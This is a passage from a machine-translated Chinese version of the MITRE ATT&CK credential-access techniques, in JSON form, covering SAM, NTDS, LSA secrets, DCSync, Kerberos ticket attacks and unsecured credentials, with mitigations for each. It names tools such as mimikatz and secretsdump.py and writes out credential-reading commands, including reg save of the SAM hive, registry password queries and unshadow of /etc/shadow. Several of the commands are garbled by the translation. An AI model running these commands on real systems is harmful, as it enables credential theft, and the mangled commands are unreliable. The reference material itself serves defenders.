          "content": "CREDSSP：为远程桌面服务提供SSO和网络级别的身份验证。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1040",
        "name": "预防端点的行为",
        "description": [
          [
            {
              "type": "text",
              "content": "在Windows 10上，启用攻击表面减少（ASR）规则以确保LSASS并防止凭证窃取。"
            }
          ]
        ]
      },
      {
        "id": "M1043",
        "name": "凭证访问保护",
        "description": [
          [
            {
              "type": "text",
              "content": "使用Windows 10，Microsoft实施了称为凭证Guard的新保护措施，以保护可用于通过凭据转储形式获得凭据的LSA秘密。默认情况下不配置它，并且具有硬件和固件系统要求。它也不能防止所有形式的凭证倾倒。"
            }
          ]
        ]
      },
      {
        "id": "M1028",
        "name": "操作系统配置",
        "description": [
          [
            {
              "type": "text",
              "content": "考虑禁用或限制NTLM。考虑禁用WDigest身份验证。"
            }
          ]
        ]
      },
      {
        "id": "M1027",
        "name": "密码策略",
        "description": [
          [
            {
              "type": "text",
              "content": "确保本地管理员帐户在网络上的所有系统中都具有复杂的独特密码。"
            }
          ]
        ]
      },
      {
        "id": "M1026",
        "name": "特权帐户管理",
        "description": [
          [
            {
              "type": "text",
              "content": "除非受到严格控制，否则请勿将用户或管理域帐户放在本地管理员组中，因为这通常等于在所有系统上拥有具有相同密码的本地管理员帐户。遵循企业网络设计和管理的最佳实践，以限制行政层的特权帐户使用。"
            }
          ]
        ]
      },
      {
        "id": "M1025",
        "name": "特权过程完整性",
        "description": [
          [
            {
              "type": "text",
              "content": "在Windows 8.1和Windows Server 2012 R2上，为LSA启用受保护的过程灯。"
            }
          ]
        ]
      },
      {
        "id": "M1017",
        "name": "用户培训",
        "description": [
          [
            {
              "type": "text",
              "content": "限制培训用户和管理员在跨帐户和系统之间的凭据重叠，不要将相同的密码用于多个帐户。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1003.002",
    "name": "Security Account Manager",
    "tactics": [
      {
        "id": "TA0006",
        "name": "Credential Access"
      }
    ],
    "technique": "OS Credential Dumping",
    "version": "1.1",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以尝试通过内存技术或通过存储SAM数据库的Windows注册表从安全客户经理（SAM）数据库中提取凭据材料。SAM是一个数据库文件，其中包含HOST的本地帐户，通常是使用"
        },
        {
          "type": "code",
          "content": " NET用户"
        },
        {
          "type": "text",
          "content": "命令找到的数据库文件。列举SAM数据库需要系统级访问。"
        }
      ],
      [
        {
          "type": "text",
          "content": "许多工具可用于通过内存技术检索SAM文件："
        }
      ],
      [
        {
          "type": "list",
          "content": "pwdumpx.exe"
        },
        {
          "type": "list",
          "content": "gsecdump"
        },
        {
          "type": "list",
          "content": "mimikatz"
        },
        {
          "type": "list",
          "content": "secretsdump.py"
        }
      ],
      [
        {
          "type": "text",
          "content": "另外，可以从注册表中提取SAM："
        }
      ],
      [
        {
          "type": "list",
          "content": "Reg保存HKLM \\ Sam Sam"
        },
        {
          "type": "list",
          "content": "Reg保存HKLM \\系统系统"
        }
      ],
      [
        {
          "type": "text",
          "content": "然后，CredDump7可以用于处理本地SAM数据库以检索哈希。"
        }
      ],
      [
        {
          "type": "text",
          "content": "笔记："
        }
      ],
      [
        {
          "type": "list",
          "content": "RID 500帐户是本地内置的管理员。"
        },
        {
          "type": "list",
          "content": "RID 501是客人帐户。"
        },
        {
          "type": "list",
          "content": "用户帐户以1,000多种启动开始。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1028",
        "name": "操作系统配置",
        "description": [
          [
            {
              "type": "text",
              "content": "考虑禁用或限制NTLM。"
            }
          ]
        ]
      },
      {
        "id": "M1027",
        "name": "密码策略",
        "description": [
          [
            {
              "type": "text",
              "content": "确保本地管理员帐户在网络上的所有系统中都具有复杂的独特密码。"
            }
          ]
        ]
      },
      {
        "id": "M1026",
        "name": "特权帐户管理",
        "description": [
          [
            {
              "type": "text",
              "content": "除非受到严格控制，否则请勿将用户或管理域帐户放在本地管理员组中，因为这通常等于在所有系统上拥有具有相同密码的本地管理员帐户。遵循企业网络设计和管理的最佳实践，以限制行政层的特权帐户使用。"
            }
          ]
        ]
      },
      {
        "id": "M1017",
        "name": "用户培训",
        "description": [
          [
            {
              "type": "text",
              "content": "限制培训用户和管理员在跨帐户和系统之间的凭据重叠，不要将相同的密码用于多个帐户。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1003.003",
    "name": "NTDS",
    "tactics": [
      {
        "id": "TA0006",
        "name": "Credential Access"
      }
    ],
    "technique": "OS Credential Dumping",
    "version": "1.2",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以尝试访问或创建Active Directory Domain数据库的副本，以窃取凭据信息，并获得有关域名成员（例如设备，用户和访问权限）的其他信息。默认情况下，NTDS文件（NTDS.DIT）位于域控制器的"
        },
        {
          "type": "code",
          "content": "％SystemRoot％\\ ntds \\ ntds.dit "
        },
        {
          "type": "text",
          "content": "中。"
        }
      ],
      [
        {
          "type": "text",
          "content": "除了在Active域控制器上寻找NTDS文件外，对手还可以搜索包含相同信息或相似信息的备份。"
        }
      ],
      [
        {
          "type": "text",
          "content": "以下工具和技术可用于列举NTDS文件以及整个Active Directory Hashes的内容。"
        }
      ],
      [
        {
          "type": "list",
          "content": "音量阴影副本"
        },
        {
          "type": "list",
          "content": "secretsdump.py"
        },
        {
          "type": "list",
          "content": "使用内置的Windows工具NtDsutil.exe"
        },
        {
          "type": "list",
          "content": "调用ninjacopy"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1041",
        "name": "加密敏感信息",
        "description": [
          [
            {
              "type": "text",
              "content": "确保正确固定域控制器备份。"
            }
          ]
        ]
      },
      {
        "id": "M1027",
        "name": "密码策略",
        "description": [
          [
            {
              "type": "text",
              "content": "确保本地管理员帐户在网络上的所有系统中都具有复杂的独特密码。"
            }
          ]
        ]
      },
      {
        "id": "M1026",
        "name": "特权帐户管理",
        "description": [
          [
            {
              "type": "text",
              "content": "除非受到严格控制，否则请勿将用户或管理域帐户放在本地管理员组中，因为这通常等于在所有系统上拥有具有相同密码的本地管理员帐户。遵循企业网络设计和管理的最佳实践，以限制行政层的特权帐户使用。"
            }
          ]
        ]
      },
      {
        "id": "M1017",
        "name": "用户培训",
        "description": [
          [
            {
              "type": "text",
              "content": "限制培训用户和管理员在跨帐户和系统之间的凭据重叠，不要将相同的密码用于多个帐户。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1003.004",
    "name": "LSA Secrets",
    "tactics": [
      {
        "id": "TA0006",
        "name": "Credential Access"
      }
    ],
    "technique": "OS Credential Dumping",
    "version": "1.0",
    "description": [
      [
        {
          "type": "text",
          "content": "具有系统访问主机的对手可能会尝试访问本地安全管理局（LSA）秘密，这些秘密可以包含各种不同的凭证材料，例如服务帐户的凭证。LSA秘密存储在注册表中的"
        },
        {
          "type": "code",
          "content": " hkey_local_machine \\ security \\ policy \\ policy \\ secrets "
        },
        {
          "type": "text",
          "content": "。LSA秘密也可以从内存中倾倒。"
        }
      ],
      [
        {
          "type": "text",
          "content": "REG可用于从注册表中提取。Mimikatz可用于从内存中提取秘密。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1027",
        "name": "密码策略",
        "description": [
          [
            {
              "type": "text",
              "content": "确保本地管理员帐户在网络上的所有系统中都具有复杂的独特密码。"
            }
          ]
        ]
      },
      {
        "id": "M1026",
        "name": "特权帐户管理",
        "description": [
          [
            {
              "type": "text",
              "content": "遵循企业网络设计和管理的最佳实践，以限制行政层的特权帐户使用。"
            }
          ]
        ]
      },
      {
        "id": "M1017",
        "name": "用户培训",
        "description": [
          [
            {
              "type": "text",
              "content": "限制培训用户和管理员在跨帐户和系统之间的凭据重叠，不要将相同的密码用于多个帐户。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1003.005",
    "name": "Cached Domain Credentials",
    "tactics": [
      {
        "id": "TA0006",
        "name": "Credential Access"
      }
    ],
    "technique": "OS Credential Dumping",
    "version": "1.0",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可能会尝试访问用于允许身份验证的缓存域凭据，如果域控制器不可用。"
        }
      ],
      [
        {
          "type": "text",
          "content": "在Windows Vista和Newer上，哈希格式是DCC2（域缓存凭据2版）Hash，也称为MS-CACHE V2 HASH。默认缓存凭据的数量各不相同，并且可以更改每个系统。此哈希不允许通过障碍风格的攻击，而是需要密码破解才能恢复明文密码。"
        }
      ],
      [
        {
          "type": "text",
          "content": "借助系统访问，可以使用Mimikatz，Reg和SecretsDump.py等工具/实用程序来提取cached凭据。"
        }
      ],
      [
        {
          "type": "text",
          "content": "注意：Windows Vista的凭证是使用PBKDF2得出的。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1015",
        "name": "Active Directory配置",
        "description": [
          [
            {
              "type": "text",
              "content": "考虑将用户添加到“受保护的用户” Active Directory安全组。这可以有助于限制用户明文凭据的缓存。"
            }
          ]
        ]
      },
      {
        "id": "M1028",
        "name": "操作系统配置",
        "description": [
          [
            {
              "type": "text",
              "content": "考虑限制缓存凭据的数量（HKLM \\ Software \\ Microsoft \\ Windows \\ Windows \\ Current version \\ winlogon \\ cachedlogonscountvalue）"
            }
          ]
        ]
      },
      {
        "id": "M1027",
        "name": "密码策略",
        "description": [
          [
            {
              "type": "text",
              "content": "确保本地管理员帐户在网络上的所有系统中都具有复杂的独特密码。"
            }
          ]
        ]
      },
      {
        "id": "M1026",
        "name": "特权帐户管理",
        "description": [
          [
            {
              "type": "text",
              "content": "除非受到严格控制，否则请勿将用户或管理域帐户放在本地管理员组中，因为这通常等于在所有系统上拥有具有相同密码的本地管理员帐户。遵循企业网络设计和管理的最佳实践，以限制行政层的特权帐户使用。"
            }
          ]
        ]
      },
      {
        "id": "M1017",
        "name": "用户培训",
        "description": [
          [
            {
              "type": "text",
              "content": "限制培训用户和管理员在跨帐户和系统之间的凭据重叠，不要将相同的密码用于多个帐户。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1003.006",
    "name": "DCSync",
    "tactics": [
      {
        "id": "TA0006",
        "name": "Credential Access"
      }
    ],
    "technique": "OS Credential Dumping",
    "version": "1.0",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以尝试通过使用称为DCSYNC的技术来模拟Windows域控制器的应用程序编程接口（API）来访问凭据和其他敏感信息。"
        }
      ],
      [
        {
          "type": "text",
          "content": "域控制器上的管理员，域名管理员和企业管理员组或计算机帐户的成员能够运行DCSYNC从Active Directory中获取密码数据，其中可能包括可能有用的帐户的当前和历史哈希，例如KRBTGT和管理员。然后，可以将哈希人用于创建金票，以用于通过票证或更改帐户操作中指出的帐户密码。"
        }
      ],
      [
        {
          "type": "text",
          "content": "DCSYNC功能已包含在Mimikatz的“ Lsadump”模块中。LSADUMP还包括NetSync，该NetSync通过旧版复制协议执行DCSYNC。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1015",
        "name": "Active Directory配置",
        "description": [
          [
            {
              "type": "text",
              "content": "管理“复制目录更改”的访问控制列表以及与域控制器复制相关的其他权限。"
            }
          ]
        ]
      },
      {
        "id": "M1027",
        "name": "密码策略",
        "description": [
          [
            {
              "type": "text",
              "content": "确保本地管理员帐户在网络上的所有系统中都具有复杂的独特密码。"
            }
          ]
        ]
      },
      {
        "id": "M1026",
        "name": "特权帐户管理",
        "description": [
          [
            {
              "type": "text",
              "content": "除非受到严格控制，否则请勿将用户或管理域帐户放在本地管理员组中，因为这通常等于在所有系统上拥有具有相同密码的本地管理员帐户。遵循企业网络设计和管理的最佳实践，以限制行政层的特权帐户使用。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1003.007",
    "name": "Proc Filesystem",
    "tactics": [
      {
        "id": "TA0006",
        "name": "Credential Access"
      }
    ],
    "technique": "OS Credential Dumping",
    "version": "1.1",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以从PROC文件系统或"
        },
        {
          "type": "code",
          "content": "/proc "
        },
        {
          "type": "text",
          "content": "收集凭据。PROC文件系统是一个伪文件系统，用作基于Linux的系统管理虚拟内存的内核数据结构的接口。对于每个过程，"
        },
        {
          "type": "code",
          "content": "/proc/<PID>/MAPS "
        },
        {
          "type": "text",
          "content": "文件显示了如何在该过程的虚拟地址空间中映射内存。和"
        },
        {
          "type": "code",
          "content": "/proc/<pid>/mem "
        },
        {
          "type": "text",
          "content": "，用于调试目的，可访问该过程的虚拟地址空间。"
        }
      ],
      [
        {
          "type": "text",
          "content": "当使用根特权执行时，对手可以在包含指示凭据的模式的系统上搜索这些内存位置，例如在内存结构或缓存的哈希中寻找固定字符串。当没有特权访问的情况下运行时，进程仍然可以查看自己的虚拟内存位置。某些服务或程序可能会在过程内存中的清晰文本中保存凭据。"
        }
      ],
      [
        {
          "type": "text",
          "content": "如果按照Web浏览器的权限运行或运行，过程可以搜索"
        },
        {
          "type": "code",
          "content": "/MAPS "
        },
        {
          "type": "text",
          "content": "＆"
        },
        {
          "type": "code",
          "content": "＆/mem "
        },
        {
          "type": "text",
          "content": "常见网站凭据模式的位置（也可以用于查找相同结构内的相邻内存）可以找到哈希或透明文本凭据。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1027",
        "name": "密码策略",
        "description": [
          [
            {
              "type": "text",
              "content": "确保root帐户在网络上的所有系统中具有复杂的独特密码。"
            }
          ]
        ]
      },
      {
        "id": "M1026",
        "name": "特权帐户管理",
        "description": [
          [
            {
              "type": "text",
              "content": "遵循限制对特权帐户访问的最佳实践，以避免敌对的程序访问敏感信息。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1003.008",
    "name": "/etc/passwd and /etc/shadow",
    "tactics": [
      {
        "id": "TA0006",
        "name": "Credential Access"
      }
    ],
    "technique": "OS Credential Dumping",
    "version": "1.0",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以尝试将"
        },
        {
          "type": "code",
          "content": "/etc/passwd "
        },
        {
          "type": "text",
          "content": "和"
        },
        {
          "type": "code",
          "content": "/etc/shadow "
        },
        {
          "type": "text",
          "content": "的内容转移到脱机密码破解。大多数现代Linux操作系统都使用"
        },
        {
          "type": "code",
          "content": "/etc/passwd "
        },
        {
          "type": "text",
          "content": "和"
        },
        {
          "type": "code",
          "content": "/etc/shadow "
        },
        {
          "type": "text",
          "content": "的组合来存储用户帐户信息，包括"
        },
        {
          "type": "code",
          "content": "/etc/etchsshice </代码>。默认情况下，/etc/shadow "
        },
        {
          "type": "text",
          "content": "仅由root用户读取。"
        }
      ],
      [
        {
          "type": "text",
          "content": "Linux实用程序，Unshadow，可用于以适合密码破解实用程序（例如Ripper John the Ripper）的格式组合两个文件："
        },
        {
          "type": "code",
          "content": "＃/usr/usr/bin/unshadow/etshadow/etc/passwd/etc/passwd/etc/etc>/tmp>/tmp/tmp/crack.password.db "
        },
        {
          "type": "text",
          "content": ""
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1027",
        "name": "密码策略",
        "description": [
          [
            {
              "type": "text",
              "content": "确保root帐户在网络上的所有系统中具有复杂的独特密码。"
            }
          ]
        ]
      },
      {
        "id": "M1026",
        "name": "特权帐户管理",
        "description": [
          [
            {
              "type": "text",
              "content": "遵循限制访问特权帐户的最佳实践，以避免敌对的程序访问此类敏感信息。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1558.001",
    "name": "Golden Ticket",
    "tactics": [
      {
        "id": "TA0006",
        "name": "Credential Access"
      }
    ],
    "technique": "Steal or Forge Kerberos Tickets",
    "version": "1.1",
    "description": [
      [
        {
          "type": "text",
          "content": "具有KRBTGT帐户密码哈希的对手可能会伪造Kerberos票务票（TGT），也称为金票。金门票使对手能够为Active Directory中的任何帐户生成身份验证材料。"
        }
      ],
      [
        {
          "type": "text",
          "content": "然后，使用金票，对手可以请求票务授予服务（TGS）机票，这使得可以访问特定资源。金票要求对手与密钥配电中心（KDC）互动，以获得TGS。"
        }
      ],
      [
        {
          "type": "text",
          "content": "KDC服务运行在属于Active Directory域的一部分的域控制器上。KRBTGT是Kerberos密钥配送中心（KDC）服务帐户，负责加密和签署所有Kerberos门票。可以使用OS凭据转储和对域控制器的特权访问获得KRBTGT密码哈希。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1015",
        "name": "Active Directory配置",
        "description": [
          [
            {
              "type": "text",
              "content": "为了包含先前生成的金票的影响，请将内置的KRBTGT帐户密码重置两次，这将使与Krbtgt Hash和其他从其派生的Kerberos门票中创建的任何现有的金票无效。对于每个域，请更改KRBTGT帐户密码一次，强制复制，然后第二次更改密码。考虑每180天旋转一次旋转KRBTGT帐户密码。"
            }
          ]
        ]
      },
      {
        "id": "M1026",
        "name": "特权帐户管理",
        "description": [
          [
            {
              "type": "text",
              "content": "将域管理员帐户权限限制为域控制器和有限的服务器。将其他管理功能委托给单独的帐户。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1558.002",
    "name": "Silver Ticket",
    "tactics": [
      {
        "id": "TA0006",
        "name": "Credential Access"
      }
    ],
    "technique": "Steal or Forge Kerberos Tickets",
    "version": "1.0",
    "description": [
      [
        {
          "type": "text",
          "content": "具有目标服务帐户的密码哈希（例如SharePoint，MSSQL）的对手可能会伪造Kerberos票务授予服务（TGS）票，也称为银票。Kerberos TGS门票也被称为服务票。"
        }
      ],
      [
        {
          "type": "text",
          "content": "银票的范围比黄金门票更具限制，因为它们仅使对手能够访问特定资源（例如MSSQL）和托管资源的系统；但是，与金门票不同，具有伪造银票能力的对手能够创建TGS门票而无需与密钥配送中心（KDC）互动，这可能会使检测更加困难。"
        }
      ],
      [
        {
          "type": "text",
          "content": "可以使用OS凭据转储或KerberoAsting获得目标服务的密码哈希。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1041",
        "name": "加密敏感信息",
        "description": [
          [
            {
              "type": "text",
              "content": "在可能的情况下，启用AES Kerberos加密（或其他更强的加密算法），而不是RC4。"
            }
          ]
        ]
      },
      {
        "id": "M1027",
        "name": "密码策略",
        "description": [
          [
            {
              "type": "text",
              "content": "确保密码长度（理想情况下是25个以上的字符）和服务帐户的复杂性，并确保这些密码定期过期。还要考虑使用小组托管服务帐户或其他第三方产品（例如密码跳级）。"
            }
          ]
        ]
      },
      {
        "id": "M1026",
        "name": "特权帐户管理",
        "description": [
          [
            {
              "type": "text",
              "content": "将服务帐户限制为最小所需的特权，包括在域管理员等特权群体中的成员资格。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1558.003",
    "name": "Kerberoasting",
    "tactics": [
      {
        "id": "TA0006",
        "name": "Credential Access"
      }
    ],
    "technique": "Steal or Forge Kerberos Tickets",
    "version": "1.2",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可能会滥用有效的Kerberos票务票（TGT）或嗅探网络流量，以获取可能容易受到Brute Force的票务服务（TGS）票。"
        }
      ],
      [
        {
          "type": "text",
          "content": "服务主名（SPN）用于唯一标识Windows服务的每个实例。要启用身份验证，Kerberos要求SPN与至少一个服务登录帐户（专门任务运行服务的帐户）相关联。"
        }
      ],
      [
        {
          "type": "text",
          "content": "拥有有效Kerberos票务票（TGT）的对手可能会要求从域控制器（DC）的任何SPN提供一张或多个Kerberos票务服务（TGS）服务票。这些门票的一部分可以使用RC4算法进行加密，这意味着Kerberos 5 TGS-REP ETYPE ETYPE 23与SPN相关的服务帐户的哈希人被用作私钥，因此很容易受到可能暴露出明文凭证的离线蛮力攻击的影响。。"
        }
      ],
      [
        {
          "type": "text",
          "content": "可以使用网络流量捕获的服务门票可以执行相同的行为。"
        }
      ],
      [
        {
          "type": "text",
          "content": "破裂的哈希可以通过访问有效帐户来实现持久性，特权升级和横向移动。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1041",
        "name": "加密敏感信息",
        "description": [
          [
            {
              "type": "text",
              "content": "在可能的情况下，启用AES Kerberos加密（或其他更强的加密算法），而不是RC4。"
            }
          ]
        ]
      },
      {
        "id": "M1027",
        "name": "密码策略",
        "description": [
          [
            {
              "type": "text",
              "content": "确保密码长度（理想情况下是25个以上的字符）和服务帐户的复杂性，并确保这些密码定期过期。还要考虑使用小组托管服务帐户或其他第三方产品（例如密码跳级）。"
            }
          ]
        ]
      },
      {
        "id": "M1026",
        "name": "特权帐户管理",
        "description": [
          [
            {
              "type": "text",
              "content": "将服务帐户限制为最小所需的特权，包括在域管理员等特权群体中的成员资格。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1558.004",
    "name": "AS-REP Roasting",
    "tactics": [
      {
        "id": "TA0006",
        "name": "Credential Access"
      }
    ],
    "technique": "Steal or Forge Kerberos Tickets",
    "version": "1.0",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可能会揭示通过密码破解Kerberos消息的kerberos预先验证的帐户的凭据。"
        }
      ],
      [
        {
          "type": "text",
          "content": "预先验证提供了防离线密码破解的保护。启用后，请求访问资源的用户通过发送Authentication Server请求（AS-REQ）消息的时间戳来启动与域控制器（DC）的通信，并使用其密码的哈希进行加密。如果并且仅当DC能够使用用户密码的哈希（Hash）成功解密时间戳，则它将发送一个身份验证服务器响应（AS-REP）消息，该消息包含票证授权票（TGT）。AS-REP消息的一部分用用户的密码签名。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对于无预先验证的每个帐户，对手可以在没有加密时间戳的情况下发送AS-REQ消息，并接收带有TGT数据的AS-REP消息，该消息可能会使用不安全算法（例如RC4）进行加密。恢复的加密数据可能容易受到离线密码破解攻击的攻击，类似于Kerberoasting并揭示了明文凭据。"
        }
      ],
      [
        {
          "type": "text",
          "content": "可以滥用注册到域的帐户，无论是否具有特殊特权，都可以通过使用带有LDAP过滤器的PowerShell（例如PowerShell）来列出所有具有预先验证的域帐户。另外，对手可以为每个用户发送AS-REQ消息。如果直流没有错误响应，则该帐户不需要预先验证，并且AS-REP消息将已经包含加密数据。"
        }
      ],
      [
        {
          "type": "text",
          "content": "破裂的哈希可以通过访问有效帐户来实现持久性，特权升级和横向移动。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1047",
        "name": "审计",
        "description": [
          [
            {
              "type": "text",
              "content": "默认情况下，启用了Kerberos预先验证。较旧的协议可能不支持预先验证，因此可以禁用此设置。确保所有帐户在可能的情况下都具有预先验证，并为设置进行审核更改。诸如PowerShell之类的Windows工具可用于轻松找到哪些帐户已禁用了预先验证。"
            }
          ]
        ]
      },
      {
        "id": "M1041",
        "name": "加密敏感信息",
        "description": [
          [
            {
              "type": "text",
              "content": "在可能的情况下，启用AES Kerberos加密（或其他更强的加密算法），而不是RC4。"
            }
          ]
        ]
      },
      {
        "id": "M1027",
        "name": "密码策略",
        "description": [
          [
            {
              "type": "text",
              "content": "确保密码长度（理想情况下是25个以上的字符）和服务帐户的复杂性，并确保这些密码定期过期。还要考虑使用小组托管服务帐户或其他第三方产品（例如密码跳级）。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1552.001",
    "name": "Credentials In Files",
    "tactics": [
      {
        "id": "TA0006",
        "name": "Credential Access"
      }
    ],
    "technique": "Unsecured Credentials",
    "version": "1.2",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以搜索本地文件系统和远程文件共享，以搜索包含不安全的凭据的文件。这些可以是用户创建的文件，以存储自己的凭据，一组个人的共享凭据存储，配置文件包含系统或服务的密码，或包含嵌入式密码的源代码/二进制文件。"
        }
      ],
      [
        {
          "type": "text",
          "content": "可以通过OS凭据转储从备份或保存的虚拟机中提取密码。也可以从存储在Windows域控制器上的组策略首选项中获得密码。"
        }
      ],
      [
        {
          "type": "text",
          "content": "在云和/或容器化的环境中，经过认证的用户和服务帐户凭据通常存储在本地配置和凭据文件中。它们也可以作为在容器日志中部署命令的参数找到。在某些情况下，可以在另一台计算机上复制和重复使用这些文件，也可以读取内容，然后用于身份验证而无需复制任何文件。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1047",
        "name": "审计",
        "description": [
          [
            {
              "type": "text",
              "content": "先发制地搜索包含密码的文件，并采取行动以降低发现曝光风险。"
            }
          ]
        ]
      },
      {
        "id": "M1027",
        "name": "密码策略",
        "description": [
          [
            {
              "type": "text",
              "content": "建立一个禁止在文件中存储密码的组织策略。"
            }
          ]
        ]
      },
      {
        "id": "M1022",
        "name": "限制文件和目录权限",
        "description": [
          [
            {
              "type": "text",
              "content": "将文件共享限制为特定目录，仅访问必要的用户。"
            }
          ]
        ]
      },
      {
        "id": "M1017",
        "name": "用户培训",
        "description": [
          [
            {
              "type": "text",
              "content": "确保开发人员和系统管理员意识到与可能留在端点系统或服务器上的软件配置文件中具有明文密码相关的风险。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1552.002",
    "name": "Credentials in Registry",
    "tactics": [
      {
        "id": "TA0006",
        "name": "Credential Access"
      }
    ],
    "technique": "Unsecured Credentials",
    "version": "1.1",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以在受损的系统上搜索注册表中存储不安全的凭据。Windows注册表存储系统或其他程序可以使用的配置信息。对手可能会查询注册表，以寻找已存储的凭证和密码，这些密码已存储为其他程序或服务。有时，这些凭据用于自动登录。"
        }
      ],
      [
        {
          "type": "text",
          "content": "示例命令查找与密码信息相关的注册表键："
        }
      ],
      [
        {
          "type": "list",
          "content": "本地机器Hive：REG查询HKLM /F密码 /T reg_sz /s"
        },
        {
          "type": "list",
          "content": "当前用户Hive：reg查询hkcu /f密码 /t reg_sz /s"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1047",
        "name": "审计",
        "description": [
          [
            {
              "type": "text",
              "content": "主动在注册表中搜索凭据，并试图解决风险。"
            }
          ]
        ]
      },
      {
        "id": "M1027",
        "name": "密码策略",
        "description": [
          [
            {
              "type": "text",
              "content": "请勿在注册表中存储凭据。"
            }
          ]
        ]
      },
      {
        "id": "M1026",
        "name": "特权帐户管理",
        "description": [
          [
            {
              "type": "text",
              "content": "如果有必要软件必须将凭据存储在注册表中，请确保关联帐户的权限有限，以便在对手获得的情况下不能滥用它们。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1552.003",
    "name": "Bash History",
    "tactics": [
      {
        "id": "TA0006",
        "name": "Credential Access"
      }
    ],
    "technique": "Unsecured Credentials",
    "version": "1.1",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以在受损的系统上搜索BASH命令历史记录是否存储了不安全的凭据。Bash跟踪命令用户在命令行上的类型，并使用“历史记录”实用程序。用户注销后，将历史记录到用户的"
        },
        {
          "type": "code",
          "content": " .bash_history "
        },
        {
          "type": "text",
          "content": "文件中。对于每个用户，此文件位于同一位置："
        },
        {
          "type": "code",
          "content": "〜/.bash_history "
        },
        {
          "type": "text",
          "content": "。通常，此文件会跟踪用户的最后500个命令。用户通常会在命令行上输入用户名和密码作为程序的参数，然后在登录时将其保存到此文件中。对手可以通过查找文件来滥用这一点。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1028",
        "name": "操作系统配置",
        "description": [
          [
            {
              "type": "text",
              "content": "有多种方法可以防止用户的命令历史记录被冲洗到其.bash_history文件，包括使用以下命令："
            },
            {
              "type": "code",
              "content": " set +o history> history> "
            },
            {
              "type": "text",
              "content": " set> set set -o history </code </code </code> to重新开始记录; "
            },
            {
              "type": "code",
              "content": "未设置的Histfile "
            },
            {
              "type": "text",
              "content": "被添加到用户的.bash_rc文件中；和"
            },
            {
              "type": "code",
              "content": " ln -s/dev/null〜/.bash_history "
            },
            {
              "type": "text",
              "content": "将命令写入"
            },
            {
              "type": "code",
              "content": "/dev/dev/null "
            },
            {
              "type": "text",
              "content": "而不是。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1552.004",
    "name": "Private Keys",
    "tactics": [
      {
        "id": "TA0006",
        "name": "Credential Access"
      }
    ],
    "technique": "Unsecured Credentials",
    "version": "1.1",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以在不安全的存储凭证上搜索损坏的系统上的私钥证书文件。私人密码键和证书用于身份验证，加密/解密和数字签名。通用密钥和证书文件扩展名包括：.key，.pgp，.gpg，.ppk。，.p12，.pem，.pfx，.pfx，.cer，.p7b，.aSc。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手也可能会查看通用的关键目录，例如"
        },
        {
          "type": "code",
          "content": "〜/.ssh "
        },
        {
          "type": "text",
          "content": "用于 *基于NIX的系统或"
        },
        {
          "type": "code",
          "content": " c：\\ users \\（userName）\\。ssh \\。ssh \\ </code上的ssh键> "
        },
        {
          "type": "text",
          "content": ">在Windows上。对手工具还可以搜索与加密密钥和证书有关的文件扩展的折衷系统。"
        }
      ],
      [
        {
          "type": "text",
          "content": "当设备注册到Azure AD时，生成设备密钥和传输键，并用于验证设备的身份。具有访问设备的对手可能能够导出密钥以模仿设备。"
        }
      ],
      [
        {
          "type": "text",
          "content": "在网络设备上，可以通过网络设备CLI命令（例如"
        },
        {
          "type": "code",
          "content": " crypto pki导出"
        },
        {
          "type": "text",
          "content": "）导出私钥。"
        }
      ],
      [
        {
          "type": "text",
          "content": "一些私钥需要密码或密码用于操作，因此对手也可以使用输入捕获来键盘记录或试图将密码迫使密码离线迫使密码。这些私钥可用于对SSH等远程服务进行身份验证，或用于解密其他收集的文件，例如电子邮件。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1047",
        "name": "审计",
        "description": [
          [
            {
              "type": "text",
              "content": "确保仅允许授权密钥访问关键资源并定期审核访问列表。"
            }
          ]
        ]
      },
      {
        "id": "M1041",
        "name": "加密敏感信息",
        "description": [
          [
            {
              "type": "text",
              "content": "在可能的情况下，将密钥存储在单独的加密硬件上，而不是在本地系统上。例如，在Windows系统上，系统使用TPM保护密钥和其他敏感凭证材料。"
            }
          ]
        ]
      },
      {
        "id": "M1027",
        "name": "密码策略",
        "description": [
          [
            {
              "type": "text",
